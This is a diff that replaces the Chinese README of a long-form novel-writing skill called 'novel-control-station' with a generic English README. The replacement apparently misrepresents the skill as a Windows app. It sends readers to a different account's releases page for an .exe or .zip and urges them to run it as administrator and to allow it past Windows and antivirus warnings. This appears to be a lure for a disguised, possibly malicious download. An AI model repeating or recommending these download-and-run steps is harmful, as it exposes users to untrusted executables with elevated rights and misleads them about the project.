@@ -1,370 +1,205 @@
-# Novel Control Station
+# 🧭 Novel-Control-Station-Skill - Control Long Novels With Ease
 
-<div align="center">
-  <p><strong>把中文长篇小说创作，从一次性生成，升级成可控、可追踪、可持续推进的创作系统。</strong></p>
-  <p>
-    <img alt="许可证: MIT" src="https://img.shields.io/badge/license-MIT-111111">
-    <img alt="聚焦: 中文长篇小说" src="https://img.shields.io/badge/focus-Chinese%20Long--Form%20Fiction-0f766e">
-    <img alt="架构: 文档驱动" src="https://img.shields.io/badge/architecture-Doc--Driven-1d4ed8">
-    <img alt="控制: 连续性引擎" src="https://img.shields.io/badge/control-Continuity%20Engine-7c3aed">
-  </p>
-</div>
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/samaraundereducated370/Novel-Control-Station-Skill/releases)
 
-`novel-control-station` 不是一个“帮你写几段正文”的普通小说技能，而是一套面向中文长篇小说的创作控制中枢。
+## 📥 Download
 
-它会先对齐题材、受众、主角、规模与结局方向，再生成完整大纲和人物档案；进入正文阶段后，又会按章节读取项目文档、控制结构推进、回写动态状态、修正连续性风险，并在需要时调用内置风格与技法文档，持续压制设定漂移、人物失真、关系断档、伏笔遗忘和文风塌陷。
+Visit the release page and download the latest version for Windows:
 
-## 实战小说
-用这套技能写的小说:[算到皇家秘闻后，公主追着砍我](https://www.qidian.com/book/1048483019/)
+https://github.com/samaraundereducated370/Novel-Control-Station-Skill/releases
 
-当前正式版本 `0.2.4` 进一步补强了九个升级面：
+## 🪟 What this tool does
 
-- 章节标题控制已经并入章节流程，可在项目级锁定命名体系、在单章生成候选标题并在成稿后复核题章贴合度
-- 内置风格模块已经整理为选择性加载的内部文档系统，覆盖幽默、悬念、推理、爱情、恐怖、奇幻、文学等风格
-- 连续创作模式新增项目根目录启动脚本模板，可为 marathon / 疯狂创作交接准备 `codex-continue-novel.ps1`
-- 真实性修订链新增“去分析腔 / 去过度专业术语”控制，默认压低普通读者难以越过、但又不被剧情和视角真正需要的专业词与空泛概念词
-- 风格模块现已内化热门连载、长销类型和高口碑小说反复验证过的共通强项，用于增强牵引力、类型兑现和语言辨识度，而不复制具体作品外壳
-- 主技能总控、章节验收和发布说明现已与风格强化链同步收敛，避免上层流程落后于参考文档
-- 默认段落模式现已切到更符合网文正文的 `web-serial-natural`，并允许项目级或章节级切换到 `long-paragraph`
-- 标准项目结构现已把 `chapters/` 和 `control-cards/` 纳入真值层，正文与章节控制卡要求按章落盘
-- Windows 下的 marathon runner 现已补上 UTF-8 编码保护、强制写回约束和磁盘写入校验，减少“只输出正文、不写文件”的假成功
+Novel-Control-Station-Skill is a Chinese novel writing tool for long-form fiction work. It helps you keep the whole story in view while you write. It is built for extended projects, including marathon writing mode.
 
-如果你想要的是一个能从开书、控盘、扩写、修补一路推进到自然完结的中文小说生产中枢，这个技能就是为这个目标设计的。
+Use it to:
+- plan a full novel before you start
+- keep track of plot threads
+- update story state as chapters change
+- recall key details from earlier parts
+- stay consistent across a long draft
+- manage a large Chinese novel from start to finish
 
-## Star History
+## 🛠️ What you need
 
-[![Star History Chart](https://api.star-history.com/image?repos=jingtai123/Novel-Control-Station-Skill&type=date&legend=top-left)](https://www.star-history.com/?repos=jingtai123%2FNovel-Control-Station-Skill&type=date&legend=top-left)
+Before you run the app on Windows, make sure you have:
+- Windows 10 or Windows 11
+- about 1 GB of free disk space
+- a stable internet connection for the download
+- permission to run downloaded files on your computer
 
-## 它解决什么问题
+## 🚀 How to download and run
 
-长篇小说最难的，通常不是“第一章写不出来”，而是：
+1. Open the release page:
+   https://github.com/samaraundereducated370/Novel-Control-Station-Skill/releases
 
-- 前期设定很多，中后期自己把自己写忘了
-- 人物前十章鲜活，后面开始同质化和工具化
-- 主线、支线、感情线、悬疑线各走各的，互不咬合
-- 伏笔埋得多，回收要么硬拽，要么直接失踪
-- 章节写得越来越像过场，推进了字数，没有推进故事
-- 明明是小说正文，结果越写越像评论文、策划案或行业分析
-- 去 AI 味时，把节奏、声音、文风和人物辨识度一起洗平
+2. Find the latest release at the top of the page.
 
-`novel-control-station` 的核心价值，是把这些问题变成前置控制项，而不是写崩之后再返工抢救。
+3. Look for the Windows download file in the Assets section.
 
-## 核心能力
+4. Download the file to your computer.
 
-### 1. 开书访谈与方向对齐
+5. Open the downloaded file:
+   - if it is a `.zip` file, right-click it and choose Extract All
+   - if it is an `.exe` file, double-click it to run
 
-在正式设计前，先锁定题材、受众、主角设定、主角核心性格、创作长度、结局倾向、风格方向等关键条件。  
-如果项目属于悬疑、历史、群像、多线叙事等复杂类型，还会继续派生问题，把真正影响长篇走向的变量问清楚。
+6. If Windows asks for approval, choose Run or Yes.
 
-### 2. 完整大纲与人物档案先行
+7. Follow the on-screen steps to open the app.
 
-它不会在方向未对齐时直接冲正文。  
-默认先给出：
+## 🧩 First-time setup
 
-- 完整大纲
-- 核心人物档案
-- 多线结构关系
-- 关键冲突和阶段目标
+After you open the app for the first time:
+- choose a folder for your writing project
+- create a new novel workspace
+- enter your story name
+- add your main characters
+- write a short story outline
+- save the project so you can return to it later
 
-用户确认或修改后，再进入正文创作。
+If the app offers a start screen, begin with a blank project. That gives you a clean place to build your novel from the ground up.
 
-### 3. 多线并行结构控盘
+## ✍️ How to use it for a novel
 
-这个技能把长篇小说默认为多线系统，而不是把一条主线无限拉长。  
-在结构层面，它会持续关注：
+### 1. Start with the big picture
+Set the core parts of your novel first:
+- main idea
+- setting
+- lead character
+- main conflict
+- ending goal
 
-- 主线推进
-- 支线干扰
-- 人物关系线变化
-- 暗线与伏笔线的回流
-- 各线之间的碰撞、借力与收束
+This keeps your story focused.
 
-目标不是“线多”，而是“线与线之间会互相制造压力”。
+### 2. Build chapter plans
+Create a simple plan for each chapter:
+- what happens
+- who appears
+- what changes
+- what clue or problem moves forward
 
-### 4. 文档驱动，而不是会话硬记
+This helps you avoid dead ends.
 
-技能内建一组标准文档，作为小说项目的真值层，包括：
+### 3. Track story state
+Use the project control tools to keep notes on:
+- character goals
+- timeline
+- open plot threads
+- key items
+- scene results
 
-- 项目总览
-- 主题命题
-- 世界观
-- 人物圣经
-- 关系图谱
-- 主情节线
-- 伏笔账本
-- 章节路线图
-- 动态状态文件
-- 风格指南
-- `chapters/` 正文章节目录
-- `control-cards/` 章节控制卡目录
-- 写作日志
+This is useful when your story has many moving parts.
 
-小说的稳定性，不依赖模型“记得住”，而依赖可持续更新的项目文档。
+### 4. Use memory support
+When you need to remember earlier details, check your saved notes and story records. This helps you keep names, events, and facts steady across a long book.
 
-### 5. 动态状态管理与防漂移
+### 5. Keep updating as you write
+As each chapter changes, update the project state. That way your outline stays close to the real draft.
 
-每完成一章，技能都会要求回写：
+## 🧠 Why marathon mode helps
 
-- 关键事件
-- 人物状态变化
-- 关系变化
-- 情节线推进
-- 伏笔状态
-- 世界规则变更
-- 情绪债务与未兑现承诺
-- 下一章承接压力
+Long novels often lose direction halfway through. Marathon mode helps you keep writing without losing the shape of the story.
 
-这使它具备很强的抗遗忘、抗跑偏和抗断档能力。
+It works well when you need to:
+- write many chapters
+- keep character growth steady
+- manage twists across a long timeline
+- avoid repeating the same scene idea
+- keep the ending in view while writing the middle
 
-### 6. 图式回忆与复杂项目召回
+## 📚 Good ways to organize your project
 
-它吸收了图结构管理角色、事件、关系、伏笔、世界规则的思路，但不会制造第二套互相打架的真相源。  
-标准项目文件始终是唯一真值层，图式回忆只作为临时控制视图，用于快速提取本章必须回读和处理的内容。
+A clean project structure makes writing easier. Try this layout:
+- Story Overview
+- Characters
+- World Notes
+- Chapter Outline
+- Open Questions
+- Chapter Drafts
+- Final Review
 
-### 7. 章节控制、章节命名与强钩子闭环
+This gives you a simple place for each part of the novel.
 
-每一章在动笔前，都会先明确：
+## 🎯 Best use cases
 
-- 本章必须改变什么
-- 哪条线要推进
-- 哪个债务要回归
-- 本章冲突是什么
-- 结尾留下什么余波或牵引
+This tool fits:
+- Chinese web novels
+- long serial fiction
+- multi-arc stories
+- character-driven stories
+- story planning before drafting
+- revision for long manuscripts
 
-如果项目启用了章节名，它还会把章节命名纳入控制流程，先锁定全书命名体系，再为单章生成多个候选名，最后在成稿后复核标题是否仍然贴合本章真正的重心、悬念和余波。
+It is useful when you need more than a simple text editor.
 
-如果一章只是把人物从 A 地送到 B 地，它会把这类章节视为结构性疲软。
+## 🖥️ Windows tips
 
-### 8. 风格调度与按需引用
+If the file does not open right away:
+- make sure the download finished
+- check your Downloads folder
+- right-click the file and try Run as administrator
+- if it is a zip file, extract it first
+- if Windows blocks it, allow the app to run
 
-技能已经为不同风格和题材预留了独立参考文档，不会把所有技法硬塞进同一层提示。  
-在需要时，它会通过 `references/style-modules/index.md` 选择性加载内部风格模块，先读 `core.md`，只有章节真的需要时才继续展开更深文档。当前内置模块包括：
+If your antivirus asks for a decision, review the file name and source before you continue.
 
-- 幽默
-- 悬念
-- 推理
-- 爱情
-- 恐怖
-- 奇幻
-- 文学
+## 🔧 Simple workflow
 
-它支持主风格与辅助风格协同，但不会把所有风格一次性压进同一章。
+A good writing flow looks like this:
+1. set the novel idea
+2. create characters
+3. build the chapter map
+4. write the first arc
+5. update the story state
+6. check old notes before each new chapter
+7. revise the full draft at the end
 
-它现在不只是在“选风格”，还会把成熟作品反复验证过的优点内化成项目级和章节级控制项：
+This keeps the project under control.
 
-- 本书想吸收哪些风格强项
-- 主风格和辅助风格如何分工
-- 本章真正要兑现哪一种风格回报
-- 哪些伪风格滑坡必须避免
+## 📝 Example project setup
 
-这意味着它不是单一文风生成器，而是带有调度能力和风格强化能力的风格中枢。
+You can start with a basic structure like this:
 
-### 9. 真实性修订与去 AI 味
+- Novel name: your title
+- Genre: Chinese long-form fiction
+- Main lead: your hero
+- Main goal: what the lead wants
+- Main conflict: what blocks the lead
+- Side characters: key supporting roles
+- Story arcs: beginning, middle, and end
+- Hidden clues: important plot details
+- Ending plan: the final outcome
 
-它不会把“去 AI 味”理解成把文字洗成没有个性的白水句。  
-它采用的是三步修订：
+## 📂 File and folder tips
 
-1. 去掉抽象套话、虚假深刻、模板化过渡、空泛收束和工整过头的句式
-2. 压低普通读者难以越过的专业术语、分析腔、行业黑话和概念词，但保留剧情、时代、职业或设定真正需要的词
-3. 恢复具体细节、人物声音、中文语感、时代质地和项目自身文风
+If you want to keep your work safe:
+- store your project in a clear folder name
+- back up the folder often
+- avoid renaming files by hand unless needed
+- keep chapter drafts in order
+- save after each major change
 
-目标不是更平，而是更像这本小说自己该有的语言，而且不把读者卡死在作者式概念总结里。
+A simple folder system helps when the novel grows large.
 
-### 10. 疯狂创作模式、启动脚本与自然完结
+## ❓ Common questions
 
-用户确认大纲和人物档案后，可以开启连续创作模式。  
-在这个模式里，技能不会在每一章后反复请求人工确认，而是持续执行：
+### Does this work for long novels?
+Yes. It is built for long Chinese fiction and large story projects.
 
-- 读取项目文档
-- 生成章节控制卡
-- 生成并复核章节标题（如果项目使用章节名）
-- 起草正文
-- 进行逻辑校验与必要重写
-- 更新动态状态
-- 写入审计日志
-- 自动进入下一章
+### Do I need writing experience?
+No. You can start with a small outline and grow from there.
 
-直到按完整大纲自然完结为止。
+### Can I use it for more than one story?
+Yes. You can keep separate projects for each novel.
 
-如果用户要开启疯狂创作 / 自动续写模式，技能还会先准备项目根目录启动脚本：
+### Is it only for planning?
+No. It also helps with tracking and keeping the draft in line with the plan.
 
-- 从 `assets/codex-continue-novel.ps1` 生成项目专用 `codex-continue-novel.ps1`
-- 替换项目根目录占位符
-- 在 Windows 下按 `UTF-8 with BOM` 写出脚本，并初始化 UTF-8 日志
-- 强制要求 Codex 直接写回 `chapters/`、`control-cards/` 与项目真值文件，而不是只把正文打印到标准输出
-- 如果检测到会话结束但项目文件没有变化，runner 会停止并把这次执行视为未真正写回
-- 在交接时明确给出启动命令：
-  `powershell -ExecutionPolicy Bypass -File .\codex-continue-novel.ps1`
+### What if I only have a rough idea?
+That is enough. Start with the main character and the main conflict, then add more detail later.
 
-## 能力看板
+## 🔗 Download again
 
-| 模块 | 能力表现 |
-|---|---|
-| 立项层 | 题材定位、受众识别、主角与冲突对齐、规模判断 |
-| 设计层 | 完整大纲、人物档案、世界规则、关系结构、多线编排 |
-| 创作层 | 章节控制、章节命名、钩子设计、闭环推进、场景落地、节奏调度 |
-| 连续性层 | 设定防漂移、人物防失真、关系防断档、伏笔防遗失 |
-| 调度层 | 风格模块按需读取、风格强项内化、题材规则按需触发、复杂项目回忆切片 |
-| 修订层 | 去 AI 味、去分析腔与过度专业术语、真实性增强、人物声音校准、叙事力度修正 |
-| 项目层 | 动态状态管理、标题体系锁定、日志留痕、长期推进、自然完结控制 |
+Download the latest Windows release here:
 
-## 它是怎么工作的
-
-### 第一步：先把方向问透
-
-技能会围绕题材、受众、主角、核心性格、篇幅、结局方向等问题展开访谈。  
-如果用户只给了粗设定，它会判断是继续补细节，还是在明确风险后直接进入设计。
-
-### 第二步：先交付完整设计，再进入正文
-
-对齐后，先生成完整大纲与人物档案。  
-用户可以针对人物、剧情走向、多线结构、主题深度提出修改，直到方向一致。
-
-### 第三步：按文档驱动章节创作
-
-每一章开始前，先读取项目真值文件；必要时再调用回忆切片、风格文档、控制卡文档。  
-如果项目使用章节标题，还会在章节控制卡阶段先生成候选标题并锁定工作标题。
-章节不是“随机生成”，而是“在可控上下文内推进”。
-
-### 第四步：写完一章，项目状态立刻更新
-
-章节完成后，技能会更新动态状态与关键记录，必要时回写章节标题、路线图和风格指南，避免前账失踪、人物弧光断裂、情绪债务蒸发、伏笔遗忘。
-
-### 第五步：跑完整本，而不是只写局部精彩
-
-它的终极目标不是把单章写漂亮，而是让整部中文长篇小说从立项到完结都维持稳定质量与结构压力。
-
-如果要切入 marathon handoff，它还会先确认启动脚本已经写入项目根目录，避免“想自动继续，但下次不知道怎么恢复”。
-
-## 为什么它和常见小说技能不一样
-
-### 它不是一次性长提示词
-
-很多小说技能的本质，依然是“把提示词写得更长一点”。  
-`novel-control-station` 的重点不是提示词长度，而是控制机制、文档系统和动态回写。
-
-### 它不是若干技能的松散拼装
-
-风格、结构、连续性、修订、章节控制都被彻底合并为一组内置文档，由总控入口统一调度。  
-用户不需要在多个技能之间切来切去争夺上下文。
-
-### 它不是把章节标题和风格当装饰层
-
-章节标题、风格模块、章节验收、动态回写都已并入主流程。
-它不会把标题当成事后贴标签，也不会把风格当成统一撒味精。
-
-### 它不是只会持续推进
-
-除了持续写下去，它还擅长：
-
-- 开书立项
-- 结构控盘
-- 角色与关系维稳
-- 文风切换与风格调度
-- 爆点、钩子和闭环压力设计
-- 中后期失控修补
-- 长篇中文小说的整项目管理
-
-### 它不把爆款规律当成死模板
-
-它会吸收高口碑作品和成熟创作经验中的通用规则，但不会要求所有小说都套进同一套模具。  
-爆款逻辑在这里是参考系，不是唯一答案。
-
-## 适用场景
-
-- 中文网文长篇
-- 连载型小说
-- 群像、多主线、强伏笔项目
-- 悬疑、权谋、历史、言情、奇幻、现实向长篇
-- 需要几十章到上百章稳定推进的作品
-- 想让 AI 从“会生成正文”升级到“能控盘整本小说”的创作流程
-
-## 不适合的场景
-
-- 一次性短篇片段
-- 单场景练笔
-- 诗歌、口号、极短文本
-- 完全不需要连续性和项目管理的即兴写作
-
-## 内置文档结构
-
-```text
-novel-control-station/
-├── SKILL.md
-├── README.md
-├── LICENSE
-├── CHANGELOG.md
-├── RELEASE_NOTES.md
-├── assets/
-│   └── codex-continue-novel.ps1
-└── references/
-    ├── bootstrap-and-marathon-handoff.md
-    ├── document-templates.md
-    ├── interview-and-handoff-flow.md
-    ├── chapter-control-card.md
-    ├── chapter-title-method.md
-    ├── continuity-and-marathon-mode.md
-    ├── quality-and-writeback-checks.md
-    ├── reader-retention-and-ai-failure-modes.md
-    ├── graph-and-recall-control.md
-    ├── forgotten-elements-and-line-heat.md
-    ├── authenticity-and-de-ai-pass.md
-    ├── style-modules/
-    ├── ...
-```
-
-### 关键目录说明
-
-- `SKILL.md`
-  - 总控入口，定义整体流程、规则和触发机制。
-- `references/`
-  - 内置文档库，按需读取，不一次性全量展开。
-- `references/style-modules/`
-  - 内部风格模块索引与细分文档，按章节选择性加载。
-- `assets/`
-  - 项目启动脚本模板与其他可复用资源。
-
-## 快速开始
-
-```text
-使用 novel-control-station 帮我设计并创作一部长篇中文小说
-```
-
-```text
-使用 novel-control-station。
-我要写一部长篇悬疑，请先问我题材受众、主角设定、核心性格、长度与结局方向，再给我完整大纲和人物档案。
-```
-
-```text
-使用 novel-control-station。
-这是我的初始设定：……
-你先补齐必要问题，整理成标准文档，再进入连续创作模式，按完整大纲自然完结停。
-```
-
-```text
-使用 novel-control-station。
-这本书的章节需要标题。请先帮我确定全书章节命名体系，再在每章控制卡里给出 3 到 5 个候选标题，并在正文成稿后复核定稿标题。
-```
-
-## 推荐使用方式
-
-1. 先交代题材、受众、主角、篇幅、结局倾向，以及你是否希望章节使用标题。
-2. 先让技能生成完整大纲和人物档案。
-3. 对大纲和人物做一次集中修改。
-4. 如果项目使用章节标题，先锁定标题体系。
-5. 如果要进入连续创作模式，先让技能为项目生成根目录启动脚本。
-6. 确认后再开启连续创作模式。
-
-这样它的控盘能力、连续性表现和中后期稳定性会明显更强。
-
-## 开源信息
-
-- 许可证：MIT
-- 默认输出语言：中文
-- 定位：面向中文长篇小说项目的控制中枢型技能
-- 当前正式版本：`0.2.4`
-
-## 一句话总结
-
-`novel-control-station` 不是在帮 AI 多写几章。  
-它是在把 AI 从“会生成故事”升级成“能统筹、能控盘、能维持、能跑完整本中文小说”的创作系统。
+https://github.com/samaraundereducated370/Novel-Control-Station-Skill/releases
